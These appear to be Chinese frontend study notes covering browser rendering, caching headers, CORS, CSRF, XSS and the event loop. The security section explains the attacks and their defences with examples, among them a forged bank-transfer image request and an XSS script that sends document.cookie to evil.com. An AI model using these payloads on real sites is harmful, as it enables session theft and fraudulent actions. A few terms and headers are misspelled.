


## 浏览器渲染实现原理


### 1. 构建 DOM 树（HTML 解析）

 - 浏览器从网络或缓存获取 HTML 字节流
 - 字节流解码器 -> Tokenizer（分词器） -> Parser（解析器）
 - 解析器逐步构建 DOM 树（Document Object Module）
 - 遇到 `<script>` 时：
	 - 阻塞 HTML 解析（除非 `async` / `defer`）
	 - 下载并执行 JS （可能修改 DOM）

优化： 
- 将 `<script>` 放在 `</body>` 前
- 使用 `async` / `defer` 避免阻塞


### 2. 构建 CSSOM 树（CSS 解析）

- 同时解析 CSS 文件（内联、`<link>`、`@import`）
- 构建 CSSOM 树（CSS Object Model），包含计算所有样式（如 `width: 50%` -> `widtih:300px`）
- CSS 是阻塞渲染的：浏览器不会渲染无样式的页面（FOUC 问题）

优化：
- 内联关键 CSS （Critical CSS）
- 避免 `@import`（会串行加载）

### 3. 构建 Render Tree


- 合并 DOM + CSSOM -> Render Tree
- 只包含可见元素：
	- 排除 `display: none`、`<script>`、`meta` 等
	- 包含 `visibility: hidden`（占位但不可见）
- 每个节点包含 计算样式 + 几何信息

### 4. 布局（Layout / Reflow）

- 计算每个元素在视口中的精确位置和尺寸（基于盒模型、浮动、Flexbox、Grid 等）
- 输出 Layout Tree（或 Box Tree）
- 触发条件：
	- 首次渲染
	- JS 修改几何属性（如 `width`、`top`）
	- 窗口 resize

**性能杀手**：  

布局是**树形递归计算**，复杂度高，应尽量避免。

### 5. 绘制（Paint / Rasterization）

- 将 Layout Tree 分解为绘制指令列表
- 光栅化（Rasterization）
	- 主线程生成绘制列表
	- 合成器线程（Compositor Thread）将指令转为位图（Bitmap）
	- 位图存储在 GPU 显存（作为纹理）

**现代优化**：

- **分块光栅化**（Tiling）：只绘制视口内区域
- **离屏光栅化**（Offscreen Raster）：提前绘制即将可见区域

### 6. 合成（Composting）

- 若页面有分层（如 `transform`、`opacity`、`will-change`），会创建多个 Layer
- 合成器线程 将多个 Layer 按 z-index 合成为最终帧
- 直接提交 GPU，按需主线程参与 -> 动画不卡顿

**关键优化**：  
使用 `transform` 和 `opacity` 实现动画（走合成器线程，**不触发 Layout/Paint**）




### 渲染相关


#### 重排（Reflow） VS 重绘（Repaint）


| 操作                         | 触发      | 影响           |
| -------------------------- | ------- | ------------ |
| 修改几何属性                     | 重排 + 重绘 | 影响后续所有元素     |
| 修改非几何属性                    | 仅重绘     | 仅当前元素        |
| 修改 `transform` / `opacity` | 仅合成     | GPU 加速，无重排重绘 |









## 浏览器缓存机制



### 缓存类型

**流程：** 浏览器先检查**强缓存** → 若失效，再走**协商缓存** → 都失效则重新下载。

| 缓存类型     | 控制字段                                                          | 是否发送请求          | 优先级 |
| -------- | ------------------------------------------------------------- | --------------- | --- |
| **强缓存**  | `Cache-Control`、`Expires`                                     | 不发送（直接请求副本）     | 高   |
| **协商缓存** | `ETag` / `If-None-Match`、`Last-Modified`/ `If-Modefied-Since` | 发送请求（服务器判断是否更新） | 低   |


### 强缓存（直接使用本地副本）

#### 1. `Cache-Control`（HTTP / 1.1）

- **常用指令**

```http
Cache-Control: max-age=3600        // 缓存 3600 秒
Cache-Control: no-cache            // 跳过强缓存，但走协商缓存
Cache-Control: no-store            // 禁止缓存（敏感数据）
Cache-Control: public              // 允许 CDN 缓存
Cache-Control: private             // 仅浏览器缓存（用户私有数据）
```


#### 2. `Expires`（HTTP / 1.0）

已淘汰

- 指定绝对过期时间（GMT 格式）

```http
Expires: Wed, 21 Oct 2025 07:28:00 GMT
```

- **缺点**：依赖客户端时间（可能被篡改）



### 协商缓存（需服务器验证）


当强缓存失效后，浏览器会携带验证头向服务器询问："资源是否更新"

**优先级**：`ETag` > `Last-Modified`（同时存在时，优先用 ETag）
#### 1. ETag / If-None-Match

- 原理：
	- 服务器首次返回资源时，附带 `ETag` （资源唯一标识，如哈希值）

```http
ETag: "abc123"
```

- 浏览器下次请求时，携带 `If-None-Match`：

```http
If-None-Match: "abc123"
```

- 服务器比对 ETag：
	- 相同 -> 返回 `304 Not Modified`（无响应体）
	- 不同 -> 返回 `200 OK` + 新资源

- **优点: **精确（基于内容哈希），适合动态资源

#### 2. Last-Modified / If-Modified-Since


- 原理：
	- 服务器返回 `last-Modified`（资源最后修改时间）：

```http
Last-Modified: Wed, 21 Oct 2025 07:28:00 GMT
```

- 浏览器下次请求携带 `If-Modified-Since`：

```http
If-Modified-Since: Wed, 21 Oct 2025 07:28:00 GMT
```


- 服务器比对修改时间：

    - **未修改** → `304 Not Modified`
    - **已修改** → `200 OK` + 新资源

- **缺点**：

    - 时间精度仅到秒（1 秒内多次修改会漏判）
    - 服务器时间可能不准




### 查看缓存


在 Chrome DevTools 的 **Network 面板**：

- **Status** 列：
    - `200 (from disk cache)` → 强缓存（磁盘）
    - `200 (from memory cache)` → 强缓存（内存，更快）
    - `304 Not Modified` → 协商缓存命中
- **Headers**：
    - Request Headers 中查看 `If-None-Match` / `If-Modified-Since`
    - Response Headers 中查看 `ETag` / `Last-Modified`


### 总结

| 资源类型   | 缓存策略                                                        |
| ------ | ----------------------------------------------------------- |
| HTML   | `Cache-Control: no-cache`  （协商缓存）                           |
| 静态资源   | `Cache-Control: max-age=31536000, immutable`  （强缓存 + 文件名哈希） |
| API 接口 | `Cache-Control: no-store` （敏感数据）或短时间强缓存（如`max-age=60`）      |
| 用户私有数据 | `Cache-Control: private, no-cache`                          |


#### 误区

| 误区                         | 正确理解                            |
| -------------------------- | ------------------------------- |
| `Ctrl+F5` 强制刷新会跳过所有缓存      | 正确（同时禁用强缓存 + 协商缓存）              |
| `no-cache`= 不缓存            | 错误！`no-cache`表示**每次需协商验证**，仍会缓存 |
| `ETag`比`Last-Modified`更耗性能 | 服务器需计算哈希，但现代 CPU 开销可忽略，且更精准     |
| 协商缓存比强缓存慢                  | 正确（多一次请求），但比重新下载快               |





## 浏览器跨域


### 浏览器的跨越（CORS）

#### 1. 什么是跨域

- 同源策略（Same-Origin Policy）是浏览器的安全机制，限制不同源（协议 + 域名 + 端口）的脚本读取对方的资源

- 同源示例：
	 - `https://api.example.com` vs `https://www.example.com` → **不同源**（域名不同）
	- `http://localhost:3000` vs `http://localhost:8080` → **不同源**（端口不同）
	- `https://example.com` vs `http://example.com` → **不同源**（协议不同）


**注意**：同源策略**不限制“发送请求”**，只限制 **“读取响应”**。  
（即：跨域请求会发送，但浏览器会**拦截 JS 读取响应**）



#### 2. 跨域解决方案


##### 1. CORS（跨域资源共享） --- 常用

- **原理**：服务器通过响应头声明允许哪些源访问
- **关键响应头**：

```http
Access-Control-Allow-Origin: https://your-frontend.com  // 或 *
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
```

- 预期请求（Preflight）：
	- 对于非简单请求（如带自定义头、JSON 请求），浏览器先发 `OPTIONS` 请求
	- 服务器需正常响应 `OPTIONS`，否则实际请求被拦截

Node.js / Express 示例：

```js
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
```

##### 2. 代理服务器（开发用）

- 原理：前端请求同源的代理服务器，代理转发到目标 API

- Webpack DevServer 代理：

```js
// vue.config.js / webpack.config.js
devServer: {
  proxy: {
    '/api': {
      target: 'https://real-api.com',
      changeOrigin: true
    }
  }
}
```

- Nginx 代理：

```nginx
location /api/ {
  proxy_pass https://real-api.com/;
}
```


##### 3. JSONP（仅限 GET）

已淘汰

- **原理**：利用 `<script>` 标签不受同源策略限制，动态创建 script 请求数据。
- **缺点**：只支持 GET，无错误处理，有 XSS 风险。

##### 4. 其他

- **WebSocket**：无跨域限制（协议不同）
- **PostMessage**：跨窗口通信（如 iframe）
- **CORS 网关**：后端统一加 CORS 头


### CSRF （Cross-Site Request Forgery）

#### 什么是 CSRF ？

**攻击目标：**

利用用户已登录的身份，在用户不知情的情况下，诱使其浏览器向目标网站发起恶意请求（如转账、改密码、删数据）。

**攻击前提：**

1. 用户已登录目标网站（如 `bank.com`），浏览器保存了身份 Cookie
2. 用户访问了攻击者控制的恶意网站（如 `evil.com`）

**示例：**

```html
<!-- 恶意网站 evil.com 的代码 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```

- 用户访问 `evil.com` 时，浏览器**自动携带 `bank.com` 的 Cookie** 发送请求。
- `bank.com` 收到请求，验证 Cookie 有效 → **执行转账！**
- **用户完全不知情**（甚至没点击任何按钮）。

**漏洞：**浏览器**自动附带 Cookie** 的机制 + 服务器**无法区分请求是用户主动发起还是被伪造的**。


#### 为什么 CSRF Token 能防御攻击 ？

**防御原理：**

确保请求是从用户从合法页面主动发起的，而非第三方伪造

##### Token 防御机制：

1. 服务器生成随机 Token（如 `abc123d4`），并嵌入到合法页面的表单或 JS 中：
```html
<!-- bank.com 的转账页面 -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="a1b2c3d4" />
  <!-- ... -->
</form>
```
2. 提交请求时，必须携带该 Token
3. 服务器验证 Token 是否匹配：
	- 匹配 -> 执行操作
	- 不匹配 -> 拒绝请求（403 Forbidden）


#### 为什么攻击者无法绕过

- **同源策略（Same-Origin Policy）** 阻止 `evil.com` 读取 `bank.com` 页面内容 → **无法获取 Token**。
- 攻击者只能伪造请求，但**无法伪造 Token**（因为不知道值）。

**Token 的核心作用**：  
**打破“请求可预测性”**，使攻击者无法构造完整有效的请求。


### XSS （Cross-Site Scripting）

**攻击目标：**

在目标网站注入恶意脚本，窃取用户数据（如 Cookie、会话）或劫持用户操作

攻击前提：

- 目标网站存在 XSS 漏洞（未对用户输入转义，直接插入 HTML）


示例：

```html
<!-- 用户提交的评论 -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

- 当其他用户访问该页面的时，恶意脚本在 `bank.com` 域下执行
- 脚本可：
	- 窃取 `document.cookie`（含会话 ID）
	- 模拟用户点击（如 "确认转账" 按钮）
	- 模拟记录、截屏等

**漏洞：** 网站**信任用户输入**，未做输出转义。



### CSRF VS XSS 

**关系**：  
**XSS 可以绕过 CSRF 防御！**  
因为 XSS 脚本在目标网站域下运行，能直接读取页面中的 CSRF Token，然后构造合法请求。

| 特性              | CSRF                  | XSS                  |
| --------------- | --------------------- | -------------------- |
| 攻击目标            | 利用用户身份执行操作            | 窃取用户数据或劫持会话          |
| 依赖              | 用户已登录 + 浏览器自动发 Cookie | 网站存在脚本注入漏洞           |
| 是否需要用户交互        | 通常不需要（自动触发）           | 需要用户访问含恶意脚本的页面       |
| 防御核心            | 确保请求是用户主动发起的（Token）   | 对输出进行 转移 / 过滤（CSP）   |
| 能否绕过 CSRF Token | 不能（同源策略保护）            | 能（XSS 可读取页面中的 Token） |


| 问题               | 答案                    |
| ---------------- | --------------------- |
| CSRF 是什么         | 利用用户身份伪造请求（如自动转账）     |
| Token 为什么能防 CSRF | 攻击者无法获取 Token（同源策略保护） |
| 另一种攻击方式？         | XSS（注入恶意脚本窃取数据）       |
| CSRF 和 XSS 的关系   | XSS 可绕过 CSRF 防御       |

**防御：** **CSRF Token + SameSite=Strict + HttpOnly Cookie + XSS 防护（转义 + CSP）**


## 浏览器的事件循环


### 1. 为什么需要事件循环

**原因**：

JavaScript 是单线程语言（只有一个主线程执行代码），但浏览器需要处理：
- 用户交互（滚动、点击）
- 网络请求（`fetch`）
- 定时器（`setTimeout`）
- 渲染（Paint、Composite）

**事件循环的作用：**

**协调同步代码、异步回调、渲染任务的执行顺序，让 JS 看起来 "同时" 处理多件事**



### 2. 事件循环的核心组件


#### 1.调用栈（Call Stack）

- 存放正在执行的函数（后进先出）
- 同步代码直接压入调用栈执行


#### 2.  Web APIs（浏览器提供的异步能力）

- 包括：`setTimeout`、`fetch`、DOM 事件、`Promise` 等
- 异步操作由浏览器内核（非 JS 引擎）处理


#### 3. 回调队列（Callback Queue）

- 存放异步回调函数（如 `setTimeout` 的回调）
- 任务队列（Task Queue）：宏任务（Macrotask）队列
- 微任务队列（Microtask Queue）：`Promise.then`、`queueMicrotask`

#### 4. 事件循环（Event Loop）

- **持续检查**：
    1. 调用栈是否为空？
    2. 微任务队列是否有任务？
    3. 宏任务队列是否有任务？
- **按优先级执行**：**微任务 > 宏任务**


**核心规则**：

1. **每次宏任务执行后，清空所有微任务**。
2. **微任务中产生的新微任务也会被立即执行**。
3. **渲染（Render）通常在宏任务之间进行**（每 16ms 一帧）。



### 宏任务 VS 微任务


| 类型       | 宏任务（Macrotask）                                                   | 微任务（Microtask）                                                     |
| -------- | ---------------------------------------------------------------- | ------------------------------------------------------------------ |
| **来源**   | `setTimeout`, `setInterval`, `requestAnimationFrame`. I/O, UI 渲染 | `Promise.then/catch/finally`, `queueMicrotask`, `MutationObserver` |
| **执行时机** | 每次事件循环取**一个**                                                    | 每次事件循环**清空整个队列**                                                   |
| **优先级**  | 低                                                                | 高                                                                  |

### 浏览器中的事件循环（含渲染）

浏览器的事件循环比 Node.js 更复杂，因为它需要协调 **JS 执行** 和 **页面渲染**：

1. **执行一个宏任务**（如 JS 脚本）
2. **执行所有微任务**
3. **渲染阶段**（仅当页面需要更新时）：
    - 样式计算 → 布局 → 绘制 → 合成
4. **进入下一轮事件循环**

**优化点：**

- 如果 JS 执行时间 > 16ms（60fps），会**跳过渲染** → 页面卡顿
- `requestAnimationFrame` 回调在**渲染前执行**，适合做动画


